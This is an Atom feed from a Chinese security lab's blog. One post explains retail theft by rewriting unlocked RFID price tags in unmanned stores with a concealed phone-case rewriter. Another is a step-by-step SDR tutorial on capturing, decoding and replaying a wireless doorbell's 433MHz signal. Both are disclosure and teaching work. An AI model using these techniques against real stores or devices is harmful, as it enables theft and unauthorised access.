<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>伏宸安全实验室-Future-Sec Information Security Lab</title>
  <subtitle>伏宸安全实验室Future-Sec Information Security Lab</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://www.future-sec.com/"/>
  <updated>2018-11-16T10:13:13.935Z</updated>
  <id>http://www.future-sec.com/</id>
  
  <author>
    <name>Future-Sec</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>无人商店0元购</title>
    <link href="http://www.future-sec.com/free-shopping-in-unmanned-stores.html"/>
    <id>http://www.future-sec.com/free-shopping-in-unmanned-stores.html</id>
    <published>2018-10-25T16:00:00.000Z</published>
    <updated>2018-11-16T10:13:13.935Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><h3 id="新零售概念"><a href="#新零售概念" class="headerlink" title="新零售概念"></a>新零售概念</h3><p> 新零售概念提出后，零售行业创新加速，伴随着人工智能和物联网在各个领域的渗透，无人售货便利店、无人售货机的概念进入大众视野，自2016年亚马逊宣布其无人便利店项目Amazon Go准备问世以来，无人便利店像雨后春笋般涌现，在以消费者为中心的商业时代，无人便利店以其高效率、优质的服务体验和低人力成本等等优势，在未来将得到巨大市场发展。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/lo95jrf43d/image7.jpg" alt="image7"></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/lo95jrf43d/image8.jpg" alt="image8"></p>
<p>无人零售多采用人工智能、物联网RFID、二维码识别等技术，但是正因为新技术的引入，而导致攻击面随之扩大，RFID标签的篡改、识别信号拦截、人工智能算法欺骗、云端通信拦截等等都有可能导致大量的盗损，并因其利用简单、攻击成本低、攻击难以检测等特点，比传统商店所面临的盗损风险更大，从而严重威胁到市场发展，因此安全是无人零售行业长足发展的基石。</p>
<h3 id="行业发展"><a href="#行业发展" class="headerlink" title="行业发展"></a>行业发展</h3><p>2016年 新零售”一词由马云在2016年杭州云栖大会上首次提及，与新制造、新金融、新技术、新能源一起被称为未来五大新趋势。“新零售”概念强调的是线上与线下将深度结合，在现代物流加持下，结合大数据、云计算等创新技术构成的新商业模式。<br>2017年下半年，无人零售以其超前的购物体验成为新零售最受资本和消费者关注的形态之一。7月1日，F5未来商店完成3000万元A+轮融资；7月3日缤果盒子完成超1亿元A轮融资；7月8日阿里巴巴无人超市“淘咖啡”的落地亮相2017年淘宝造物节。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/lo95jrf43d/image14.jpg" alt="image14"></p>
<p>截至2017年9月底我国每年无人零售企业成立数。</p>
<h3 id="安全现状"><a href="#安全现状" class="headerlink" title="安全现状"></a>安全现状</h3><ul>
<li>上海一无人超市一周遭盗窃6次防盗成了大难题</li>
<li>成都批捕首例无人超市盗窃嫌疑人</li>
<li>浙江多次盗窃无人超市 三男子被刑拘</li>
<li>东莞两月盗窃无人超市11次 “贪心”男被刑拘</li>
</ul>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/lo95jrf43d/640.jpg" alt="640"></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/lo95jrf43d/6401.jpg" alt="6401"></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/lo95jrf43d/6403.jpg" alt="6403"></p>
<p>无人商店最大问题是开放式零售形态可能面临少数顾客逃避付款，而难以完全保证商户利益的问题。</p>
<h2 id="UHF标签"><a href="#UHF标签" class="headerlink" title="UHF标签"></a>UHF标签</h2><h3 id="UHF超高频远距离RFID"><a href="#UHF超高频远距离RFID" class="headerlink" title="UHF超高频远距离RFID"></a>UHF超高频远距离RFID</h3><p>特高频Ultra High Frequency(UHF)是指频率为300~3000MHz，波长在1m~1dm的无线电波。该波段的无线电波又称为分米波。UHF标签是RFID电子标签中的一种。属于无源电子标签，在阅读器的读出范围之外时，电子标签处于无源状态，在阅读器的读出范围之内时，电子标签从阅读器发出的射频能量中提取其工作所需的电源。在我国 800/900MHz 频段 UHF 技术的具体使用频率为 840-845MHz 和920-925MHz。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/lo95jrf43d/image15.jpg" alt="image15"></p>
<p>UHF电子标签具有识别距离远、识读率高、防冲突能力强、可扩展性好等特点，读卡距离达3－10米，每秒可读100张卡，因此UHF技术大量应用在仓储、物流盘点等场所，随着无人商店的发展，UHF技术开始广泛应用于店内的商品标识上。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/lo95jrf43d/image16.jpg" alt="image16"></p>
<h3 id="UHF电子标签安全问题"><a href="#UHF电子标签安全问题" class="headerlink" title="UHF电子标签安全问题"></a>UHF电子标签安全问题</h3><p>目前无人商店使用的UHF电子标签大部分采用基于EPC Class1 Gen2（简称G2）协议的标签， EPC标签内置的芯片存储有具体的数据信息，其Tag memory（标签内存）分为Reserved（保留），EPC（电子产品代码），TID（标签识别号）和User（用户）四个独立的存储区块（Bank）。 其中</p>
<ul>
<li>Reserved区，存储Kill Password（灭活口令）和Access Password（访问口令）。</li>
<li>EPC区：存储EPC号码等，可以对供应链中的对象（包括物品、货箱、货盘、位置等）进行全球唯一的标识，无人商店中商品的唯一识别ID即存储于EPC区。</li>
<li>TID区：存储标签识别号码，每个TID号码应该是唯一的。 </li>
<li>User区：存储用户自定义的数据。 </li>
</ul>
<p>此外还有各区块的Lock（锁定）状态位等用到的也是存储性质的单元。<br>标签收到连续波（CW）照射即上电（Power-up）以后，标签可处于Ready（准备），Arbitrate（裁断），Reply（回令），Acknowledged（应答），Open（公开），Secured（保护），Killed（灭活）七种状态之一。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/lo95jrf43d/image17.jpg" alt="image17"></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/lo95jrf43d/image18.jpg" alt="image18"></p>
<p>EPC区存储的唯一标识，如果标签没有进行灭活（Killed），或者没有进行锁定（Lock）或加密码保护（Secured），就能通过读写器再次进行修改，而在实际生产环节，厂商出于成本和便捷性考虑，并没有进行灭活（Killed）、锁定（Lock）、保护（Secured）等标签数据防护手段，这就导致了可以通过外部读写器改变商品标识的风险，利用专用工具，可以把高价商品的标识与低价商品标识互换，或者把已经购买过的商品标识换到未购买过的商品上，即可轻松绕过店内的监控报警系统。</p>
<h2 id="攻击设备"><a href="#攻击设备" class="headerlink" title="攻击设备"></a>攻击设备</h2><p>基于修改EPC区唯一标识的方法，自制了隐蔽标签修改器，把读写器天线、电池、读写模块集成在一起，然后隐藏在手机壳内部，在通过耳机接口与手机通信，在APP里面进行数据操作修改，实现最大程度的隐蔽攻击。相比传统从网络层或通信层的攻击，操作简单，没有技术门槛，任何人只要掌握了工具的操作方式，即可实现攻击，危害性和影响力更为广泛。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/lo95jrf43d/image19.jpg" alt="image19"></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/lo95jrf43d/image20.jpg" alt="image20"></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/lo95jrf43d/image21.jpg" alt="image21"></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/lo95jrf43d/image22.jpg" alt="image22"></p>
<h2 id="效果演示"><a href="#效果演示" class="headerlink" title="效果演示"></a>效果演示</h2><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/lo95jrf43d/20181116172418.jpg" alt="微信图片_20181116172418"></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/lo95jrf43d/20181116172423.jpg" alt="微信图片_20181116172423"></p>
<p>Geekpwn 2018 上海站实验室无人商店“0元购”演讲，并现场对该设备进行展示。</p>
<p>视频演示：  <a href="https://www.bilibili.com/video/av36079154/" rel="external nofollow noopener noreferrer" target="_blank">https://www.bilibili.com/video/av36079154/</a></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><p>无人超市“零元购” | 挥一挥衣袖，不花钱带走一个超市<br><a href="https://mp.weixin.qq.com/s/NQ9r1kLhZ33SEGZykf9fHw" rel="external nofollow noopener noreferrer" target="_blank">https://mp.weixin.qq.com/s/NQ9r1kLhZ33SEGZykf9fHw</a></p>
</li>
<li><p>物联网安全百科<br><a href="https://iot-security.wiki/" rel="external nofollow noopener noreferrer" target="_blank">https://iot-security.wiki/</a></p>
</li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;h3 id=&quot;新零售概念&quot;&gt;&lt;a href=&quot;#新零售概念&quot; class=&quot;headerlink&quot; title=&quot;新零售概念&quot;&gt;&lt;/a&gt;新零售概
    
    </summary>
    
      <category term="物理安全" scheme="http://www.future-sec.com/categories/%E7%89%A9%E7%90%86%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="UHF" scheme="http://www.future-sec.com/tags/UHF/"/>
    
      <category term="无人商店" scheme="http://www.future-sec.com/tags/%E6%97%A0%E4%BA%BA%E5%95%86%E5%BA%97/"/>
    
      <category term="物理安全" scheme="http://www.future-sec.com/tags/%E7%89%A9%E7%90%86%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>LimeSDR 无线信号重放攻击和逆向分析</title>
    <link href="http://www.future-sec.com/wireless-signal-replay-attack-and-reverse-with-LimeSDR.html"/>
    <id>http://www.future-sec.com/wireless-signal-replay-attack-and-reverse-with-LimeSDR.html</id>
    <published>2018-09-02T16:00:00.000Z</published>
    <updated>2018-09-03T10:38:47.325Z</updated>
    
    <content type="html"><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>在这篇文章中，我们将对某宝销量最高的一款无线门铃进行无线重放攻击和逆向分析其遥控信号的演示。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/sdrcf/5b61bb3542766.png" alt=""></p>
<p>国内常见的无线遥控通常工作在315Mhz、433Mhz频率，欧美的采用868Mhz、915Mhz这2个频率。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/sdrcf/5b61c47b42c4e.jpg" alt=""></p>
<p>拆开门铃，我们可以发现解码芯片为 <a href="http://t.cn/RkWvAOk" title="华芯微HS1527" rel="external nofollow noopener noreferrer" target="_blank">华芯微HS1527</a></p>
<p>华芯微HS1527采用CMOS工艺制造,拥有20位地址码，可提供最多达1048576(2^20)种地址码，发射频率支持315Mhz与433Mhz。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/sdrcf/5b61c4807005a.png" alt=""></p>
<p>我们可以用电视棒、HackRF One、LimeSDR等SDR硬件进一步确定遥控的工作频率，打开SDR软件设置频率为315Mhz或433Mhz，然后按下遥控器，能在瀑布图上看到明显的反应：<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/sdrcf/5b61bbfa80581.png" alt=""></p>
<p>确定无线遥控工作的中心频率为：433950000</p>
<h2 id="录制信号"><a href="#录制信号" class="headerlink" title="录制信号"></a>录制信号</h2><p>Grc流程图下载地址：<a href="https://1drv.ms/f/s!AsE4BpolygfCjGfspV7_Gno3rpy5" rel="external nofollow noopener noreferrer" target="_blank">https://1drv.ms/f/s!AsE4BpolygfCjGfspV7_Gno3rpy5</a><br>用GNU Radio搭一个简单的接收流图，一方面将接收信号保存为Cfile文件，另一方面将信号以瀑布图显示作为实时反馈。因为遥控信号是433MHz，中心频率设在这个附近都可以，采样率2M就够了。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/sdrcf/5b7d72d138260.png" alt=""></p>
<p>osmocom Source使用LimeSDR接收433MHz无线信号,采样率为2M，右上QT GUI Sink将捕获的无线信号通过瀑布图显示，右下角File Sink将捕获到的无线数据包储存到test.cfile文件中。<br>执行流图可看到如下效果图：<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/sdrcf/5b61bd7500b2a.png" alt=""></p>
<p>按下遥控：<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/sdrcf/5b61bd8141677.png" alt=""></p>
<p>结束GnuRadio流图后，查看Music目录下的test.cfile:<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/sdrcf/5b7d91934831f.png" alt=""></p>
<h2 id="重放信号"><a href="#重放信号" class="headerlink" title="重放信号"></a>重放信号</h2><p>接下来再用GNU Radio写个重放信号的流图：<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/sdrcf/5b7d74c2f234e.png" alt=""></p>
<p>左侧File Source调用录制到的test.cfile信号文件，与此同时QT GUI Time Sink、QT GUI Frequency Sink模块分别在屏幕上显示时间轴（时间域）、频率幅度（频率域），osmocom Sink调用LimeSDR将信号发射出去，执行流图：<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/sdrcf/5b61c0d148305.png" alt=""></p>
<p>如果听见铃声响起，那说明这段信号是有效的，如果没有响起，可能是录制指定的频率不对或采样到的信号样本不完整，可多次尝试录制，如果是车钥匙等其他设备，其信号只有一次或几次有效性，俗称滚动码，这点请注意。</p>
<h2 id="分析信号"><a href="#分析信号" class="headerlink" title="分析信号"></a>分析信号</h2><h3 id="Audacity"><a href="#Audacity" class="headerlink" title="Audacity"></a>Audacity</h3><p>Audacity是一款跨平台的音频处理软件，我们可以拿来分析射频信号。导入录制的音频信号文件进行信号分析，然后通过其展现信号波形图来判断信号的调制方式并加以分析。</p>
<p>不过这种方式需要肉眼将波形转化成0跟1，看起来比较容易眼花。只有<strong>老司机</strong>才能很快很准确地用这种方式完成分析任务。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/sdrcf/5b7fd6a1160cc.png" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/sdrcf/5b7fd6a532db7.png" alt=""></p>
<p>导入成功后显示如下图：<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/sdrcf/5b7d8115a717e.png" alt=""></p>
<p>发现存在多段信号脉冲，我们选择一段信号后点击放大镜来进一步观察信号特征。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/sdrcf/5b7eebc9ca448.png" alt=""></p>
<p>我们将第一个宽度的蓝色条状物当作标准宽度1，空白区域当作0，空白区域的宽度能容纳几个标准宽度蓝条，就代表有几个0，以此类推，较宽的蓝色条状物能容纳几个标准宽度蓝条就代表有几个1。经验比较丰富的朋友可以通过图形，把无线射频信号转换成二进制数据</p>
<p><code>0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0</code></p>
<h3 id="Inspectrum"><a href="#Inspectrum" class="headerlink" title="Inspectrum"></a>Inspectrum</h3><p>Inspectrum是一款分析无线信号的工具，基于Linux和OSX。它兼容GNURadio、Osmocom_fft还有各类SDR设备导出的IQ文件格式（例如RTL-SDR、HackRF、BladeRF）。</p>
<p>安装Inspectrum，参考Wiki：<a href="https://github.com/miek/inspectrum/wiki/Build" rel="external nofollow noopener noreferrer" target="_blank">https://github.com/miek/inspectrum/wiki/Build</a></p>
<p>澳大利亚无线黑客 <a href="https://github.com/tresacton" title="tresacton" rel="external nofollow noopener noreferrer" target="_blank">tresacton</a> 在 Inspectrum 的基础上做了界面优化和升级，有兴趣的朋友也可以安装 <a href="https://github.com/tresacton/dspectrumgui" title="DSpectrumGUI" rel="external nofollow noopener noreferrer" target="_blank">DSpectrumGUI</a><br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> sudo apt-get install qt5-default libfftw3-dev cmake pkg-config automake autoconf</span></div><div class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">clone</span> https://github.com/jgaeddert/liquid-dsp.git</span></div><div class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> liquid-dsp</span></div><div class="line"><span class="meta">$</span><span class="bash"> ./bootstrap.sh</span></div><div class="line"><span class="meta">$</span><span class="bash"> ./configure</span></div><div class="line"><span class="meta">$</span><span class="bash"> make</span></div><div class="line"><span class="meta">$</span><span class="bash"> sudo make install</span></div><div class="line"><span class="meta">$</span><span class="bash"> sudo ldconfig</span></div><div class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> ~</span></div><div class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">clone</span> https://github.com/miek/inspectrum.git</span></div><div class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> inspectrum &amp;&amp; mkdir build &amp;&amp; <span class="built_in">cd</span> build</span></div><div class="line"><span class="meta">$</span><span class="bash"> cmake ..</span></div><div class="line"><span class="meta">$</span><span class="bash"> make</span></div><div class="line"><span class="meta">$</span><span class="bash"> sudo make install</span></div><div class="line"><span class="meta">$</span><span class="bash"> sudo ldconfig</span></div></pre></td></tr></table></figure></p>
<p>打开Inspectrum，导入我们录制的test.cfile文件。设置采样率为录制时的采样率2M，水平拖动，找到有信号的区域。然后可以通过左侧Spectrogram参数的调节、缩放工具，实现波形图的放大缩小，颜色深浅调节。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/sdrcf/5b7edc950cb72.png" alt=""></p>
<p>在原始信号上右键添加采样图，Add derived plot -&gt; Add sample plot 用鼠标拖动，调节中心频率的位置和宽度；<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/sdrcf/5b7ede054a84b.png" alt=""></p>
<p>然后在下面的采样图右键添加阈值图，Add derived plot -&gt; Add threshold plot<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/sdrcf/5b7edf77e37ff.png" alt=""></p>
<p>左侧栏的Time selection可对波形进行划分，这里我们以一位<strong>“内码”</strong>信号的宽度为标准。接着对Symbols数值进行递增，直至囊括一帧信号的波形区域：<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/sdrcf/5b87c626ab7ac.png" alt=""></p>
<p>参考 <a href="http://t.cn/RkWvAOk" title="华芯微HS1527" rel="external nofollow noopener noreferrer" target="_blank">华芯微HS1527</a> 资料文档，可以得知<strong>HS1527码型</strong>：<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/sdrcf/5b87c87db56dc.jpg" alt=""></p>
<p>现在我们知道在 inspectrum 里面看到的信号是什么意思了，总结下：一帧信号的编码格式为<strong>“≥8位同步码 + 20位内码 + 4位数据码”</strong><br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/sdrcf/5b7ee0708914c.jpg" alt=""></p>
<p>然后在阈值图右键导出解码的数据，<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/sdrcf/5b87d3ff70067.png" alt=""></p>
<p>导出的解码数据：<br><code>0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0</code></p>
<h4 id="绘制Bits数据信号的GRC流图"><a href="#绘制Bits数据信号的GRC流图" class="headerlink" title="绘制Bits数据信号的GRC流图"></a>绘制Bits数据信号的GRC流图</h4><p>前面说过一帧信号共有32位码。现在我们要绘制GRC流图，执行流图从而让LimeSDR发射出Bits数据信号。这32位码，每个码都有相应的时序进行表示。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/sdrcf/5b802837a51c2.jpg" alt=""></p>
<p><code>0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0</code></p>
<p>解码数据换算后得到的Bits数据：</p>
<p><code>1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 0, 1, 0, 0, 0, 1, 1, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 1, 1, 0, 1, 1, 1, 0, 1, 1, 1, 0, 1, 0, 0, 0, 1, 1, 1, 0, 1, 0, 0, 0, 1, 1, 1, 0, 1, 0, 0, 0, 1, 1, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 1, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 1, 1, 0, 1, 0, 0, 0</code></p>
<p>一个高电平或低电平对应4LCK，在采样率为2MHz的情况下占用时间宽度为1.114ms除以4。要每个电平占用1.114ms/4LCK，则需要让每个电平点插值1.114ms/4*2MHz≈557次<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/sdrcf/5b87d80615055.png" alt=""></p>
<ul>
<li>“Vector Source”作为标准的向量输出源模块，可以输出自定义矢量，如门铃的序列。参量Repeat决定是否重复地产生整组矢量数据。</li>
<li>“Repeat”模块是将输入的矢量进行插值复制，即将<code>&lt;a,b,c,~~~&gt;</code>复制为<code>&lt;a,a,b,b,c,c,~~~&gt;</code>。</li>
<li>“osmocom Sink”模块是作为发射机的数据信宿。</li>
<li>“WX GUI Scope Sink”模块用于查看发射出去的信号。</li>
</ul>
<h3 id="Universal-Radio-Hacker-URH"><a href="#Universal-Radio-Hacker-URH" class="headerlink" title="Universal Radio Hacker(URH)"></a>Universal Radio Hacker(URH)</h3><p>URH相⽐Audacity和Inspectrum这2款软件，特点是使用特别⽅便，包括采样、解码、重放、模拟环境等功能都可以直接在URH上面完成。而且URH⽀持市面上大多数SDR设备，支持Linux、OSX、Windows平台。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/sdrcf/5b7fdbbc5459a.png" alt=""></p>
<p>参考Wiki进行安装:<a href="https://github.com/jopohl/urh" rel="external nofollow noopener noreferrer" target="_blank">https://github.com/jopohl/urh</a> ，安装完成后打开如下图。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/sdrcf/5b7ffdc81f773.png" alt=""></p>
<p>打开“File”菜单,可以直接录制信号或导入录制的信号<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/sdrcf/5b87dd528d421.png" alt=""></p>
<p>我们点击“Record signal”进行信号录制，按下遥控，右侧会显示信号频谱。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/sdrcf/5b87dea936e97.png" alt=""></p>
<p>保存我们录制的信号文件，软件会自动打开文件然后回到首页。左下角我们可以设置把信号实时解调为Bits、HEX、ASCII数据流。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/sdrcf/5b87e5bee87c4.png" alt=""></p>
<p>还可以重放信号，实时调试。更多功能可以查看 <a href="https://github.com/jopohl/urh/releases/download/v2.0.0/userguide.pdf" title="操作使用手册" rel="external nofollow noopener noreferrer" target="_blank">操作使用手册</a> 进行学习。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/sdrcf/5b7ffe2d6f0fd.png" alt=""></p>
<h2 id="更多姿势重放信号"><a href="#更多姿势重放信号" class="headerlink" title="更多姿势重放信号"></a>更多姿势重放信号</h2><p>通过上述方式，我们已对SDR捕获到的无线信号进行分析，并把信号文件转换成了二进制数据，可使用GnuRadio对数据进行重放、修改测试。接下介绍几款硬件，可以DIY便携式信号录制、重放设备。</p>
<h3 id="DIY攻击设备"><a href="#DIY攻击设备" class="headerlink" title="DIY攻击设备"></a>DIY攻击设备</h3><p>我们可以使用Arduino开发板和很常见的超再生模块或者CC1101模块配合RC-Switch库制作一款便携式射频接收/重放设备。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/sdrcf/5b7d614aa3bb7.jpg" alt=""></p>
<h3 id="RFcat"><a href="#RFcat" class="headerlink" title="RFcat"></a>RFcat</h3><p>RFCat USB Radio Dongle能够在300 - 928MHz之间的频率上发射，接收，频谱分析，使用户能够嗅探或攻击在这些频率范围内传输的任何无线数据协议。其中包括：家庭自动化系统，智能电表，SCADA系统，“物联网”设备，移动设备等等。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/sdrcf/5b61ce4db8ce7.jpg" alt=""></p>
<h3 id="EZ430-Chronos"><a href="#EZ430-Chronos" class="headerlink" title="EZ430 Chronos"></a>EZ430 Chronos</h3><p>德州仪器生产的EZ430 Chronos手表由于采用了MSP430芯片，该芯片支持发射1GHz以下频率的无线信号,覆盖市面上各种常见的无线遥控频率（315MHz、433MHz、868MHz、915MHz）<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/sdrcf/5b61ce2710fdb.jpg" alt=""></p>
<h3 id="GoodWatch"><a href="#GoodWatch" class="headerlink" title="GoodWatch"></a>GoodWatch</h3><p>GoodWatch是逆向工程师和业余无线电爱好者必备的一款手表，它包括RPN计算器，十六进制编辑器，反汇编器和距离70厘米的无线电收发器。它由Casio 3208系列 计算器手表改装而成。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/sdrcf/5b7fffe2d0a51.jpg" alt=""></p>
<h3 id="YARD-Stick-One"><a href="#YARD-Stick-One" class="headerlink" title="YARD Stick One"></a>YARD Stick One</h3><p>Great Scott Gadgets 的YARD Stick One一款由美国无线电专家Michael Ossmann 最新研发的一款无线电DONGLE, 与PC通过USB端口连接，它可以用来接收、发射低于1GHz的数字无线信号,主要性能规格如下：<br>-半双工发射和接收<br>-正式操作频段：300-348 MHz, 391-464 MHz, 782-928 MHz<br>-非正式操作频段：281-361 MHz, 378-481 MHz, 749-962 MHz<br>-调制方式： ASK, OOK, GFSK, 2-FSK, 4-FSK, MSK<br>-数据传输率：高达500 kbps<br>-USB 2.0全速传输<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/sdrcf/5b61cec8190b8.png" alt=""></p>
<h3 id="PandwaRF"><a href="#PandwaRF" class="headerlink" title="PandwaRF"></a>PandwaRF</h3><p>PandwaRF是一款射频分析工具，由手机或PC控制的低于1 GHz的无线收发器。 其目的是非常容易地捕获，显示和传输RF数据。 它可以使用BLE或USB连接到Android智能手机，使用USB连接到Linux。 它基于着名的RfCat＆Yard Stick One工具和德州仪器CC1111 RF收发器，但具有许多新功能，使PandwaRF成为完美的便携式RF分析工具。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/sdrcf/5b87ee11aee61.jpg" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h2&gt;&lt;p&gt;在这篇文章中，我们将对某宝销量最高的一款无线门铃进行无线重放攻击和逆向分析其遥控信号的演示。&lt;br&gt;&lt;img src=&quot;https://im
    
    </summary>
    
      <category term="无线电安全" scheme="http://www.future-sec.com/categories/%E6%97%A0%E7%BA%BF%E7%94%B5%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="LimeSDR" scheme="http://www.future-sec.com/tags/LimeSDR/"/>
    
      <category term="无线电" scheme="http://www.future-sec.com/tags/%E6%97%A0%E7%BA%BF%E7%94%B5/"/>
    
      <category term="无线电重放攻击" scheme="http://www.future-sec.com/tags/%E6%97%A0%E7%BA%BF%E7%94%B5%E9%87%8D%E6%94%BE%E6%94%BB%E5%87%BB/"/>
    
      <category term="无线门铃逆向" scheme="http://www.future-sec.com/tags/%E6%97%A0%E7%BA%BF%E9%97%A8%E9%93%83%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>LimeSDR 上手指南</title>
    <link href="http://www.future-sec.com/Limesdr-introduce.html"/>
    <id>http://www.future-sec.com/Limesdr-introduce.html</id>
    <published>2018-08-19T16:00:00.000Z</published>
    <updated>2018-08-20T11:19:38.565Z</updated>
    
